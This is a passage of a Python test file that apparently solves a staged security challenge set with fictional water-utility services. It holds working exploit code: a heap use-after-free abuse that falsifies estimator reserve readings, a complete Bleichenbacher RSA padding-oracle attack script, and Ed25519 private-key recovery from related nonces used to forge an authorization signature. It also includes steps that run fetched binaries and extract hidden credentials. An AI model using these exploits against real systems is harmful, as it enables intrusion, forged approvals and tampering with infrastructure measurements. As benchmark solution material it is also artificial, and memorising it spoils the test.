            descriptor = self.evidence["sequencer"]
            baseline = binding(sequencer_id, revision, program=program(descriptor["opcodes"], ("LOAD", 4), ("HALT",)))
            status, response = request(self.discovered_route("archive.observations"), method="POST", body=baseline, expected=201)
            self.assertEqual(response["record"]["status"], "completed")
            # The first authorized_indices boundary is crossed; the read is rejected but timed.
            boundary = max(descriptor["authorized_indices"]) + 1
            crossing = binding(sequencer_id, revision, program=program(descriptor["opcodes"], ("LOAD", boundary), ("HALT",)))
            status, response = request(self.discovered_route("archive.observations"), method="POST", body=crossing, expected=201)
            record = response["record"]
            self.assertEqual(record["status"], "late-authorization-rejection")
            self.assertFalse(record["write_performed"])
            self.evidence["boundary"] = boundary

        with self.subTest(card="W16.3 an experiment with a signal"):
            measure_byte = self.evidence["measure_byte"]
            descriptor = self.evidence["sequencer"]
            references = {str(slot): measure_byte(slot) for slot in descriptor["authorized_indices"][4:7]}
            target_slot = self.evidence["boundary"] + 127
            target = measure_byte(target_slot)
            status, _ = request(
                self.discovered_route("archive.signal-experiment"), method="POST", body=binding(sequencer_id, revision, operation="verify", reference_values=references, target_slot=target_slot,
                        recovered_byte=target ^ 1, repetitions=8, bit_order="lsb0"))
            status, response = request(self.discovered_route("archive.signal-experiment"), method="POST", body=binding(sequencer_id, revision, operation="verify", reference_values=references, target_slot=target_slot,
                        recovered_byte=target, repetitions=8, bit_order="lsb0"),
                expected=201)
            self.assertEqual(response["record"]["independent_conditions"], 8)

        with self.subTest(card="W16.4 what the instrument remembers"):
            measure_byte = self.evidence["measure_byte"]
            descriptor = self.evidence["sequencer"]
            start = self.evidence["boundary"] + 128
            recovered = bytes(measure_byte(slot) for slot in range(start, start + 32))
            self.assertEqual(crc32c(recovered[:28]), int.from_bytes(recovered[28:], "big"))
            field_revision = recovered[:2].decode(errors="replace").strip()
            record_request = binding(sequencer_id, revision, record_id=f"CAL-CRR-OG2-{field_revision}",
                                      field_revision=field_revision, calibration=base64.b64encode(recovered).decode())
            status, response = request(self.discovered_route("archive.instrument-history"), method="POST", body=record_request, expected=201)
            self.assertEqual(response["record"]["sha256"], hashlib.sha256(recovered).hexdigest())

    def _process_session(self) -> str:
        """Establish (or re-establish) a process-view session via the read-to-feed gateway."""
        business = self.host("business_workplace")
        planning = self.host("planning_data")
        planner = {"X-ARWC-Planner-Session": "@planner"}
        status, contract = request(self.discovered_route("business.integration-contract"), expected=200)
        binding = {
            "integration_client": contract["record"]["integration_client"],
            "report_binding": self.evidence["reconciliation_record"],
            "scope": contract["record"]["scope"],
            "feed": self.evidence["feed_id"],
        }
        integration = {**planner, "X-ARWC-Integration-Session": contract["integration_session"]}
        status, result = request(self.discovered_route("planning.integration-session"), method="POST",
                                  headers=integration, body=binding, expected=201)
        self.evidence["process_view"] = result["process_view"]
        # Crawl the process service client reference if not yet discovered.
        process_ref = result.get("client_reference")
        if process_ref and process_ref not in self.__class__.__dict__.get("_visited_refs", set()):
            if not hasattr(self.__class__, "_visited_refs"):
                self.__class__._visited_refs = set()
            queue = [process_ref]
            while queue:
                url = queue.pop(0)
                if url in self.__class__._visited_refs:
                    continue
                self.__class__._visited_refs.add(url)
                _, doc = request(url, expected=200)
                if isinstance(doc, dict):
                    base = result["process_view"]
                    for route in doc.get("routes", []):
                        tmpl = route["template"].replace("https://process-view.arwc.test", base)
                        self.__class__._routes[route["key"]] = tmpl
                    for link in doc.get("related", []):
                        if link not in self.__class__._visited_refs:
                            queue.append(link)
        return result["process_session"]

    # ------------------------------------------------------------------ W19
    def test_w19_diagnostic_binary(self) -> None:
        self.evidence["process_session"] = self._process_session()
        base = self.evidence["process_view"]
        session = self.evidence["process_session"]

        with self.subTest(card="W19.1 the diagnostic nobody retired"):
            status, response = request(self.discovered_route("process.diagnostic-program"), token=session, expected=200)
            record = response["record"]
            artifact = base64.b64decode(response["artifact_b64"], validate=True)
            self.assertTrue(artifact.startswith(b"\x7fELF\x02\x01\x01"))
            self.assertEqual(hashlib.sha256(artifact).hexdigest(), record["sha256"])
            # Recover the binary's embedded input string from its .rodata (a plain
            # ASCII run bounded by non-printable bytes), rather than guessing it.
            printable = re.findall(rb"[ -~]{6,}", artifact)
            migration_record = next(s.decode() for s in printable if s.decode().startswith("MIG-"))
            write_bytes("/var/lib/fieldlink-connector/diag-binary", artifact)
            executed = inside_bytes("/var/lib/fieldlink-connector/diag-binary")
            self.assertEqual(executed.returncode, 0, executed.stderr.decode())
            self.assertEqual(executed.stdout, struct.pack("<Q", w19_verifier(migration_record)))
            self.evidence["migration_record"] = migration_record
            self.evidence["project_family"] = record["project_family"]

        with self.subTest(card="W19.2 a second interpretation"):
            # The short outlet tag ("OG2") used throughout these record IDs.
            og_tag = self.evidence["feed_id"].split("-")[1]
            name = f"WRAP-FFFFFFFF-{og_tag}"
            body = {"record": name, "rolling32": f"{w19_rolling(name):08x}"}
            status, _ = request(self.discovered_route("process.signature-record-interpretation"), method="POST", token=session, body={**body, "rolling32": "00000000"})
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("process.signature-record-interpretation"), method="POST", token=session, body=body, expected=201)
            self.assertEqual(response["record"]["execution"], "i386-compatibility")

        with self.subTest(card="W19.3 the hidden check"):
            # The migration record is the deciding input; the executed verifier
            # authenticates each supporting decision alongside it.
            site_code = self.evidence["asset_bundle"]["asset"].split("-")[1]
            records = ["OUTLET_A:800", "OUTLET_B:1200", "LEGACY:4294967295", f"{site_code}:204", self.evidence["migration_record"]]
            decisions = [{"record": item, "rolling32": f"{w19_rolling(item):08x}", "verifier64": f"{w19_verifier(item):016x}"} for item in records]
            status, _ = request(self.discovered_route("process.signature-program"), method="POST", token=session, body={"decisions": decisions[:-1]})
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("process.signature-program"), method="POST", token=session, body={"decisions": decisions}, expected=201)
            self.assertEqual(response["record"]["record_id"], self.evidence["migration_record"])
            self.assertEqual(response["record"]["decision"], "valid")

        with self.subTest(card="W19.4 a map from the old diagnostic"):
            group_suffix = self.evidence["outlet_group"]
            self.evidence["legacy_project"] = "CRR-CTRL-" + self.evidence["migration_record"].rsplit("-", 1)[-1]
            mapping = {
                "legacy_project": self.evidence["project_family"], "current_project": self.evidence["legacy_project"],
                "legacy_identifiers": {"OUTLET_A": f"{group_suffix}/GT-CRR-02A", "OUTLET_B": f"{group_suffix}/GT-CRR-02B"},
                "instruments": dict(zip(("OUTLET_A", "OUTLET_B"), sorted(self.evidence["instruments"]))),
            }
            digest = hashlib.sha256(json.dumps(mapping, sort_keys=True, separators=(",", ":")).encode()).hexdigest()
            map_request = {"migration_record": self.evidence["migration_record"], "comparison_digest": digest, "observation": "EVT-COMM-OG2-114"}
            status, _ = request(self.discovered_route("process.diagnostic-program-legacy"), method="POST", token=session, body={**map_request, "observation": "other"})
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("process.diagnostic-program-legacy"), method="POST", token=session, body=map_request, expected=201)
            self.assertTrue(response["record"]["historical"])
            self.evidence["w19_map_request"] = map_request
            self.evidence["map_id"] = response["record"]["record_id"]
            self.evidence["map_revision"] = response["record"]["revision"]

    # ------------------------------------------------------------------ W20
    def test_w20_nor_flash_image(self) -> None:
        base = self.evidence["process_view"]
        session = self.evidence["process_session"]

        with self.subTest(card="W20.1 what the image kept"):
            status, response = request(self.discovered_route("process.firmware-image"), token=session, expected=200)
            image = base64.b64decode(response["image_b64"], validate=True)
            self.assertEqual(hashlib.sha256(image).hexdigest(), response["record"]["sha256"])
            target = image[64:128]
            self.assertEqual(target[63], 0)
            self.assertEqual(crc32c(target[:56]), struct.unpack_from("<I", target, 56)[0])
            payload_length = struct.unpack_from("<H", target, 8)[0]
            record_id, asset, date = target[12:12 + payload_length].decode().split("\0")
            self.evidence["image"] = image
            self.evidence["image_record"] = {
                "image_sha256": hashlib.sha256(image).hexdigest(), "record_id": record_id, "asset": asset,
                "inspection_date": date, "sequence": struct.unpack_from("<I", target, 4)[0], "status": "REVIEW",
                "status_bits": target[11], "crc32c": f"{struct.unpack_from('<I', target, 56)[0]:08x}", "offset": 64,
            }

        with self.subTest(card="W20.2 a valid maintenance record"):
            image_record = self.evidence["image_record"]
            status, _ = request(self.discovered_route("process.maintenance-record"), method="POST", token=session, body={**image_record, "status": "ACCEPTED"})
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("process.maintenance-record"), method="POST", token=session, body=image_record, expected=201)
            self.assertEqual(response["record"]["status"], "REVIEW")

        with self.subTest(card="W20.3 change one record, keep the rest"):
            image = self.evidence["image"]
            instruments = sorted(self.evidence["instruments"])
            target = bytearray(b"\xff" * 64)
            payload = self.evidence["image_record"]["record_id"].encode() + b"\0" + instruments[1].encode() + b"\0" + self.evidence["image_record"]["inspection_date"].encode()
            target[:4] = b"F204"
            struct.pack_into("<I", target, 4, self.evidence["image_record"]["sequence"] + 1)
            struct.pack_into("<H", target, 8, len(payload))
            target[10] = 2
            target[11] = 1
            target[12:12 + len(payload)] = payload
            struct.pack_into("<I", target, 56, crc32c(target[:56]))
            target[63] = 0
            candidate = bytearray(image)
            candidate[128:184] = target[:56]
            candidate[184:188] = target[56:60]
            candidate[191] = 0
            operations = [
                {"kind": "program", "offset": 128, "data_b64": base64.b64encode(target[:56]).decode()},
                {"kind": "program", "offset": 184, "data_b64": base64.b64encode(target[56:60]).decode()},
                {"kind": "program", "offset": 191, "data_b64": base64.b64encode(b"\0").decode()},
            ]
            rewrite_request = {"operations": operations, "image_b64": base64.b64encode(candidate).decode()}
            status, _ = request(self.discovered_route("process.maintenance-record-update"), method="POST", token=session,
                                 body={"operations": list(reversed(operations)), "image_b64": rewrite_request["image_b64"]})
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("process.maintenance-record-update"), method="POST", token=session, body=rewrite_request, expected=201)
            self.assertEqual(response["record"]["status"], "ACCEPTED")
            self.assertFalse(response["record"]["live_telemetry_changed"])

    # ------------------------------------------------------------------ W22
    def test_w22_sealed_viewer(self) -> None:
        base = self.evidence["process_view"]
        session = self.evidence["process_session"]

        with self.subTest(card="W22.1 the viewer in the delivery"):
            status, response = request(self.discovered_route("process.sealed-viewer"), token="wrong")
            self.assertEqual(status, 403)
            status, response = request(self.discovered_route("process.sealed-viewer"), token=session, expected=200)
            record = response["record"]
            viewer = base64.b64decode(response["viewer_b64"], validate=True)
            program = base64.b64decode(response["program_b64"], validate=True)
            package = base64.b64decode(response["package_b64"], validate=True)
            self.assertTrue(viewer.startswith(b"\x7fELF\x02\x01\x01"))
            self.assertEqual(hashlib.sha256(viewer).hexdigest(), record["viewer_sha256"])
            self.assertEqual(hashlib.sha256(program).hexdigest(), record["program_sha256"])
            self.assertEqual(hashlib.sha256(package).hexdigest(), record["package_sha256"])
            write_bytes("/var/lib/fieldlink-connector/sealed-viewer", viewer, mode="0700")
            write_bytes("/var/lib/fieldlink-connector/viewer-program.bin", program, mode="0600")
            executed = inside("/var/lib/fieldlink-connector/sealed-viewer", "/var/lib/fieldlink-connector/viewer-program.bin")
            self.assertEqual(executed.returncode, 0, executed.stderr)
            observed = json.loads(executed.stdout)
            registers, memory, steps = w22_run_vm(program)
            self.assertEqual(observed["registers"], registers)
            self.assertEqual(observed["steps"], steps)
            self.evidence["w22_delivery"] = response
            self.evidence["w22_project_id"] = record["project_id"]

        with self.subTest(card="W22.2 the machine inside the viewer"):
            cases = self.evidence["w22_delivery"]["record"]["ordinary_cases"]
            results = [w22_public(base64.b64decode(case["program_b64"])) for case in cases]
            status, _ = request(self.discovered_route("process.sealed-viewer-execute"), method="POST", token=session, body={"cases": results[:-1]})
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("process.sealed-viewer-execute"), method="POST", token=session, body={"cases": results}, expected=201)
            self.assertEqual(len(response["record"]["cases"]), len(cases))

        with self.subTest(card="W22.3 the decision inside the sealed project"):
            program = base64.b64decode(self.evidence["w22_delivery"]["program_b64"])
            registers, memory, _ = w22_run_vm(program)
            project_id = self.evidence["w22_project_id"]
            material = project_id.encode() + b"\0" + memory[0x40:0x80] + b"".join(struct.pack("<H", r) for r in registers)
            key = hashlib.sha256(material).digest()
            status, _ = request(self.discovered_route("process.sealed-project-open"), method="POST", token=session, body={"project_id": project_id, "key_hex": "00" * 32})
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("process.sealed-project-open"), method="POST", token=session, body={"project_id": project_id, "key_hex": key.hex()}, expected=201)
            helper = base64.b64decode(response["review_helper_b64"], validate=True)
            self.assertTrue(helper.startswith(b"MZ"))
            trace_artifact("W22 review helper", helper)
            self.evidence["w22_helper_sha256"] = response["review_helper_sha256"]
            self.evidence["w22_project"] = response["record"]["project"]
            visible = [
                token.decode("utf-16le") for token in re.findall(rb"(?:[\x20-\x7e]\x00){6,}", helper)
                if token.decode("utf-16le").endswith("-review")
            ]
            if len(visible) != 1:
                raise AssertionError(
                    f"W22 reviewer derivation failed: expected one visible decoy, found {len(visible)}"
                )
            self.evidence["w22_visible_reviewer"] = visible[0]
            self.evidence["w22_reviewer"] = w22_recover_reviewer(helper, visible[0])
            self.evidence["w22_archive_context"] = response["archive_context"]

        with self.subTest(card="W22.4 the reviewer who was never listed"):
            archive_context = self.evidence["w22_archive_context"]
            review_request = {
                "helper_sha256": self.evidence["w22_helper_sha256"], "reviewer": self.evidence["w22_reviewer"],
                "session": archive_context["session"], "comparison": archive_context["comparison"],
                "project": self.evidence["w22_project"],
            }
            status, _ = request(self.discovered_route("maintenance.unlisted-reviewer"), method="POST", token=session,
                                 body={**review_request, "reviewer": "someone-else-review"})
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("maintenance.unlisted-reviewer"), method="POST", token=session, body=review_request, expected=201)
            record = response["record"]
            self.assertTrue(record["historical"])
            self.assertFalse(record["current_identity"])
            self.assertFalse(record["control_authority"])

    # ------------------------------------------------------------------ W23
    def test_w23_estimator_heap(self) -> None:
        base = self.evidence["process_view"]
        session = self.evidence["process_session"]
        site_code = self.evidence["asset_bundle"]["asset"].split("-")[1]
        estimator = f"EST-{site_code}-23"
        instrument_b = sorted(self.evidence["instruments"])[1]

        def post(path: str, body: dict, *, expected: int | None = None) -> tuple[int, dict]:
            return request(f"{base}{path}", method="POST", token=session, body=body, expected=expected)

        with self.subTest(step="W23 baseline before the scored action"):
            status, baseline = post(
                "/api/control-commands",
                {"estimator": estimator, "mode": "baseline"}, expected=201,
            )
            artifact = base64.b64decode(baseline["artifact_b64"], validate=True)
            if hashlib.sha256(artifact).hexdigest() != baseline["record"]["sha256"]:
                raise AssertionError("W23 estimator derivation failed: artifact digest does not match")
            trace_artifact("W23 estimator", artifact)
            artifact_path = "/var/lib/fieldlink-connector/estimator23"
            write_bytes(artifact_path, artifact)
            ordinary_run = inside(artifact_path, "--ordinary")
            reproducer_run = inside(artifact_path, "--reproduce")
            if ordinary_run.returncode or reproducer_run.returncode:
                raise AssertionError(
                    "W23 estimator derivation failed: reproducer execution failed: "
                    + (ordinary_run.stderr or reproducer_run.stderr)
                )
            try:
                ordinary_fields = dict(
                    field.split("=", 1) for field in ordinary_run.stdout.split()[1:]
                )
                ordinary = {
                    key: value if key == "quality" else float(value)
                    for key, value in ordinary_fields.items()
                }
            except (ValueError, TypeError) as error:
                raise AssertionError(
                    f"W23 estimator derivation failed: ordinary output is malformed: {error}"
                ) from error
            analysis = w23_analyze_reproducer(
                reproducer_run.stdout, ordinary, self.evidence["source_district"],
            )
            if analysis["allocation_size"] != baseline["record"]["object_size"]:
                raise AssertionError("W23 estimator derivation failed: allocation size disagrees")
            self.evidence["w23_analysis"] = analysis

        with self.subTest(card="W23.1 a measurement with side effects (exploit)"):
            analysis = self.evidence["w23_analysis"]
            ordinary_key = next(
                key for key in ordinary if self.evidence["source_district"].startswith(key)
            )
            exploit = {"estimator": estimator, "operations": [
                {"op": "add", "source_id": instrument_b, "value": ordinary[ordinary_key]},
                {"op": "add", "source_id": instrument_b, "value": ordinary[ordinary_key]},
                {"op": "add", "source_id": analysis["probe"], "value": 0.0},
                {"op": "write-stale", "source_id": instrument_b,
                 "offset": analysis["controlled_offset"], "u32": analysis["controlled_u32"]},
            ]}
            status, _ = post("/api/control-commands", dict(exploit, operations=[*exploit["operations"][:3], {**exploit["operations"][3], "offset": 65}]))
            self.assertEqual(status, 409)
            status, response = post("/api/control-commands", exploit, expected=201)
            self.assertEqual(response["record"]["controlled_offset"], analysis["controlled_offset"])
            self.assertTrue(response["record"]["estimator_usable"])

        with self.subTest(card="W23.2 control beyond the measurement"):
            analysis = self.evidence["w23_analysis"]
            control = {"estimator": estimator, "operations": [
                {"op": "remove-duplicate", "source_id": instrument_b},
                {"op": "add-state", "district_id": self.evidence["source_district"]},
                {"op": "remove-state", "district_id": self.evidence["source_district"]},
                {"op": "add-state", "district_id": self.evidence["source_district"]},
                {"op": "write-stale", "offset": analysis["reserve_offset"],
                 "f64": self.evidence["reported_ml"]},
                {"op": "write-stale", "offset": analysis["quality_offset"],
                 "u32": analysis["quality"]},
            ]}
            status, _ = post("/api/control-commands/consequence", dict(control, operations=[*control["operations"], {"op": "write-stale", "offset": 8, "u32": 0}]))
            self.assertEqual(status, 409)
            status, response = post("/api/control-commands/consequence", control, expected=201)
            record = response["record"]
            self.assertEqual(
                record["writable_offsets"],
                [analysis["reserve_offset"], analysis["quality_offset"]],
            )
            self.assertEqual(record["district_id"], self.evidence["source_district"])

        with self.subTest(card="W23.3 a measurement that never existed"):
            analysis = self.evidence["w23_analysis"]
            final = {
                "allocation_case": analysis["allocation_case"],
                "district_id": self.evidence["source_district"],
                "reserve_ml": self.evidence["reported_ml"],
                "quality": analysis["quality"],
                "unaffected": analysis["unaffected"],
            }
            status, response = post("/api/estimator-runs", final, expected=201)
            record = response["record"]
            self.assertTrue(record["sufficient"])
            self.assertFalse(record["raw_process_observations_changed"])
            self.assertFalse(record["independent_instruments_changed"])
            self.evidence["w23_result"] = final

    # ------------------------------------------------------------------ W24
    def test_w24_crypto_oracle(self) -> None:
        base = self.evidence["process_view"]
        session = self.evidence["process_session"]
        # The embedded attack script below reads the session from this receipt.
        write_receipt("process-session", session)

        def get(path: str, *, token: str = session, **kw) -> tuple[int, dict]:
            return request(f"{base}{path}", token=token, **kw)

        def post(path: str, body: dict, *, token: str = session, **kw) -> tuple[int, dict]:
            return request(f"{base}{path}", method="POST", token=token, body=body, **kw)

        with self.subTest(card="W24.1 two kinds of answer"):
            status, denied = get("/api/signature-requests", token="wrong")
            self.assertEqual(status, 403)
            status, result = get("/api/signature-requests", expected=200)
            contract = result["record"]
            artifact = base64.b64decode(result["selector_artifact_b64"], validate=True)
            if hashlib.sha256(artifact).hexdigest() != contract["selector_artifact"]["sha256"]:
                raise AssertionError("W24 selector derivation failed: artifact digest does not match")
            trace_artifact("W24 selector", artifact)
            selector_path = "/var/lib/fieldlink-connector/selector24"
            write_bytes(selector_path, artifact)
            disassembled = inside("objdump", "-d", "--no-show-raw-insn", selector_path)
            if disassembled.returncode:
                raise AssertionError(
                    "W24 selector derivation failed: disassembly failed: " + disassembled.stderr
                )
            selector, selector_model = w24_selector_from_disassembly(
                disassembled.stdout, contract["selector_validation_cases"],
            )
            self.evidence["w24_contract"] = contract
            self.evidence["w24_selector"] = selector
            self.evidence["w24_selector_model"] = selector_model

        with self.subTest(card="W24.2 which answer comes next"):
            contract = self.evidence["w24_contract"]
            selector = self.evidence["w24_selector"]
            predictions = []
            for case in contract["prediction_cases"]:
                rotation = selector(int(case["request_id"], 16), case["epoch_bucket"]) & 3
                observed = "ABCD"[("ABCD".index(case["padding_class"]) + rotation) & 3]
                predictions.append({"request_id": case["request_id"], "epoch_bucket": case["epoch_bucket"], "observed_class": observed})
            wrong = json.loads(json.dumps(predictions)); wrong[2]["observed_class"] = "A"
            status, _ = post("/api/signature-oracles/current", {"record_id": contract["engineering_record"], "prediction_set": "SELECTOR-CRR-R4", "predictions": wrong})
            self.assertEqual(status, 409)
            status, response = post("/api/signature-oracles/current", {"record_id": contract["engineering_record"], "prediction_set": "SELECTOR-CRR-R4", "predictions": predictions}, expected=201)
            self.assertEqual(response["record"]["cases_accepted"], len(predictions))

        with self.subTest(card="W24.3 the diagnostic evidence bundle"):
            contract = self.evidence["w24_contract"]
            selector_model = self.evidence["w24_selector_model"]
            site_code = self.evidence["asset_bundle"]["asset"].split("-")[1]
            project_revision = int(self.evidence["w22_project"].rsplit("R", 1)[1])
            sealed_project_revision = self.evidence["w22_project_id"].rsplit("R", 1)[1]
            bundle_id = f"DIAG-EVID-{site_code}-R{sealed_project_revision}"
            attack = (
                "import base64, hashlib, json, pathlib, ssl, sys, urllib.error, urllib.request\n"
                f"BASE = {base!r}\n"
                "MASK = (1 << 64) - 1\n"
                "FIELD_P = 2**255 - 19\n"
                "CURVE_D = (-121665 * pow(121666, -1, FIELD_P)) % FIELD_P\n"
                "SCALAR_L = 2**252 + 27742317777372353535851937790883648493\n"
                "SQRT_M1 = pow(2, (FIELD_P - 1) // 4, FIELD_P)\n"
                "token = pathlib.Path('/var/lib/fieldlink-connector/receipts/process-session').read_text().strip()\n"
                "ctx = ssl.create_default_context(cafile='/tmp/arwc-ca.crt')\n"
                "headers = {'Authorization': 'Bearer ' + token, 'X-ARWC-Tenant': 'arwc', 'Content-Type': 'application/json'}\n"
                "def call(path, body=None, method='POST'):\n"
                "    data = None if body is None else json.dumps(body, separators=(',', ':')).encode()\n"
                "    req = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)\n"
                "    try: r = urllib.request.urlopen(req, context=ctx)\n"
                "    except urllib.error.HTTPError as e: r = e\n"
                "    return r.status, json.loads(r.read())\n"
                f"record = {contract!r}\n"
                "n = int(record['modulus'], 16); e = record['exponent']; c = int(record['target_ciphertext'], 16)\n"
                "bucket = record['epoch_bucket']; B = 1 << (8 * 254); queries = 0\n"
                "def select(request_id):\n"
                f"    s0 = (request_id ^ {selector_model['request_constant']}) & MASK; y = (bucket ^ {selector_model['epoch_constant']}) & MASK\n"
                f"    x = (s0 ^ ((s0 << {selector_model['left_shift']}) & MASK)) & MASK; s1 = (x ^ y ^ (x >> {selector_model['request_shift']}) ^ (y >> {selector_model['epoch_shift']})) & MASK\n"
                "    return (s1 + y) & MASK\n"
                "def oracle(multiplier):\n"
                "    global queries\n"
                "    request_id = (0x24A0000000000000 + queries) & MASK; queries += 1\n"
                "    candidate = c * pow(multiplier, e, n) % n\n"
                "    status, result = call('/api/estimator-tasks/current', {'operation': 'oracle', 'request_id': f'{request_id:016x}', 'epoch_bucket': bucket, 'ciphertext': f'{candidate:0512x}'})\n"
                "    if status != 200: raise RuntimeError((status, result, queries, multiplier))\n"
                "    raw = ('ABCD'.index(result['observed_class']) - (select(request_id) & 3)) & 3\n"
                "    return raw != 0\n"
                "def ceildiv(a, b): return -(-a // b)\n"
                "intervals = [(2 * B, 3 * B - 1)]; s = 1\n"
                "for iteration in range(1, 2050):\n"
                "    if len(intervals) > 1:\n"
                "        s += 1\n"
                "        while not oracle(s): s += 1\n"
                "    else:\n"
                "        a, b = intervals[0]; r = ceildiv(2 * (b * s - 2 * B), n)\n"
                "        while True:\n"
                "            lower = ceildiv(2 * B + r * n, b); upper = (3 * B - 1 + r * n) // a; found = False\n"
                "            for candidate in range(lower, upper + 1):\n"
                "                if oracle(candidate): s = candidate; found = True; break\n"
                "            if found: break\n"
                "            r += 1\n"
                "    updated = []\n"
                "    for a, b in intervals:\n"
                "        for r in range(ceildiv(a * s - (3 * B - 1), n), (b * s - 2 * B) // n + 1):\n"
                "            lower = max(a, ceildiv(2 * B + r * n, s)); upper = min(b, (3 * B - 1 + r * n) // s)\n"
                "            if lower <= upper: updated.append((lower, upper))\n"
                "    intervals = []\n"
                "    for current in sorted(updated):\n"
                "        if intervals and current[0] <= intervals[-1][1] + 1: intervals[-1] = (intervals[-1][0], max(intervals[-1][1], current[1]))\n"
                "        else: intervals.append(current)\n"
                "    if len(intervals) == 1 and intervals[0][0] == intervals[0][1]: break\n"
                "else: raise RuntimeError('interval did not converge')\n"
                "encoded = intervals[0][0].to_bytes(256, 'big'); separator = encoded.index(0, 2); unlock = encoded[separator + 1:]\n"
                f"status, opened = call('/api/estimator-tasks/current', {{'operation': 'open', 'bundle_id': {bundle_id!r}, 'project_id': {self.evidence['w22_project']!r}, 'project_revision': {project_revision}, 'archive_unlock_b64': base64.b64encode(unlock).decode()}})\n"
                "if status != 201: raise RuntimeError((status, opened))\n"
                "print(json.dumps({'queries': queries, 'unlock': base64.b64encode(unlock).decode(), 'opened': opened}, separators=(',', ':')))\n"
            )
            completed = inside("python3", "-c", attack)
            self.assertEqual(completed.returncode, 0, completed.stderr)
            result = json.loads(completed.stdout)
            self.assertLessEqual(result["queries"], contract["query_limit"] - 3)
            opened = result["opened"]
            bundle = opened["bundle"]
            self.assertEqual(len(bundle["records"]), 16)
            signer = base64.b64decode(bundle["signer"]["artifact_b64"], validate=True)
            self.assertEqual(hashlib.sha256(signer).hexdigest(), bundle["signer"]["sha256"])

            # Recover the signer's scalar from two Ed25519 signatures that reused
            # related nonces (the partial-nonce-reuse vulnerability), then forge
            # a fresh authorization over the bundle's own pending export request.
            field_p = 2**255 - 19
            curve_d = (-121665 * pow(121666, -1, field_p)) % field_p
            scalar_l = 2**252 + 27742317777372353535851937790883648493
            sqrt_m1 = pow(2, (field_p - 1) // 4, field_p)

            def recover_x(y: int, sign: int) -> int:
                x2 = (y * y - 1) * pow(curve_d * y * y + 1, -1, field_p) % field_p
                x = pow(x2, (field_p + 3) // 8, field_p)
                if (x * x - x2) % field_p:
                    x = x * sqrt_m1 % field_p
                if (x & 1) != sign:
                    x = field_p - x
                return x

            def point_add(left, right):
                x1, y1 = left; x2, y2 = right; term = curve_d * x1 * x2 * y1 * y2 % field_p
                return ((x1 * y2 + y1 * x2) * pow(1 + term, -1, field_p) % field_p,
                        (y1 * y2 + x1 * x2) * pow(1 - term, -1, field_p) % field_p)

            def point_mul(scalar: int, point) -> tuple:
                result = (0, 1)
                while scalar:
                    if scalar & 1:
                        result = point_add(result, point)
                    point = point_add(point, point); scalar >>= 1
                return result

            def point_encode(point) -> bytes:
                x, y = point
                return (y | ((x & 1) << 255)).to_bytes(32, "little")

            base_y = 4 * pow(5, -1, field_p) % field_p
            curve_base = (recover_x(base_y, 0), base_y)

            first, second = bundle["records"][:2]
            public = bytes.fromhex(bundle["signer"]["public_key"])

            def h(record: dict) -> int:
                return int.from_bytes(hashlib.sha512(bytes.fromhex(record["R"]) + public + base64.b64decode(record["canonical_b64"])).digest(), "little") % scalar_l

            s1 = int.from_bytes(bytes.fromhex(first["s"]), "little")
            s2 = int.from_bytes(bytes.fromhex(second["s"]), "little")
            h1, h2 = h(first), h(second)
            delta = bundle["recovery_metadata"]["signed_low60_delta"]
            high_difference = int(second["nonce_bits_60_251"]) - int(first["nonce_bits_60_251"])
            recovered = ((s2 - s1) - (high_difference << 60) - delta) * pow(h2 - h1, -1, scalar_l) % scalar_l
            self.assertEqual(point_encode(point_mul(recovered, curve_base)), public)

            message = base64.b64decode(bundle["fresh_export_request_b64"], validate=True)
            # Any fresh, message-bound nonce is valid; it is not a server-checked value.
            nonce = int.from_bytes(hashlib.sha512(message + b"/forged").digest(), "little") % scalar_l
            r_encoded = point_encode(point_mul(nonce, curve_base))
            challenge = int.from_bytes(hashlib.sha512(r_encoded + public + message).digest(), "little") % scalar_l
            scalar = (nonce + challenge * recovered) % scalar_l
            forged = {"export_request_b64": base64.b64encode(message).decode(), "R": r_encoded.hex(), "s": scalar.to_bytes(32, "little").hex()}

        with self.subTest(card="W24.4 signed by someone who never approved it"):
            status, _ = post("/api/reporting-submissions", dict(forged, s=(scalar + 1).to_bytes(32, "little").hex()))
            self.assertEqual(status, 409)
            status, response = post("/api/reporting-submissions", forged, expected=201)
            record = response["record"]
            self.assertFalse(record["maintenance_approval"])
            self.assertFalse(record["control_authority"])

    # ------------------------------------------------------------------ W08
    def test_w08_retained_bundle(self) -> None:
        import io
        import tarfile
        base = self.host("retained_archive")
        bundle_id = self.evidence["read_contract"]["retained_bundle"]

        with self.subTest(card="W08.1 something in the work bundle"):
            status, response = request(self.discovered_route("archive.bundle"), expected=200)
            record = response["record"]
            self.assertEqual(record["record_id"], bundle_id)
            self.evidence["w08_collection_id"] = record["collection_id"]

        with self.subTest(card="W08.2 reassemble the exchange"):
            artifact_bytes, content_type = get_bytes(f"{base}/api/artifacts/{bundle_id}.tar.gz")
            self.assertEqual(content_type, "application/gzip")
            with tarfile.open(fileobj=io.BytesIO(artifact_bytes), mode="r:gz") as archive:
                manifest = json.loads(archive.extractfile("exchange/manifest.json").read())
                retained: dict[int, bytes] = {}
                for index in range(14):
                    if index in (7, 11):
                        continue
                    shard = archive.extractfile(f"exchange/shard-{index:02d}.bin").read()
                    self.assertEqual(hashlib.sha256(shard).hexdigest(), manifest["sha256"][str(index)])
                    retained[index] = shard
            # Reassemble the two withheld shards via the erasure-coding math
            # the manifest itself declares (RS(14,12) over GF(256)).
            shard_7, shard_11 = w08_reconstruct(retained)
            self.assertEqual(hashlib.sha256(shard_7).hexdigest(), manifest["sha256"]["7"])
            self.assertEqual(hashlib.sha256(shard_11).hexdigest(), manifest["sha256"]["11"])
            status, _ = request(self.discovered_route("archive.reassemble"), method="POST",
                                 body={"shard_7": base64.b64encode(bytes(96)).decode(), "shard_11": base64.b64encode(bytes(96)).decode()})
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("archive.reassemble"), method="POST",
                                        body={"shard_7": base64.b64encode(shard_7).decode(), "shard_11": base64.b64encode(shard_11).decode()},
                                        expected=201)
            self.evidence["w08_collector"] = response["collector"]

        with self.subTest(card="W08.3 the collector inside the handover"):
            collector = self.evidence["w08_collector"]
            fragments = []
            for index, expected in enumerate(collector["fragments"]):
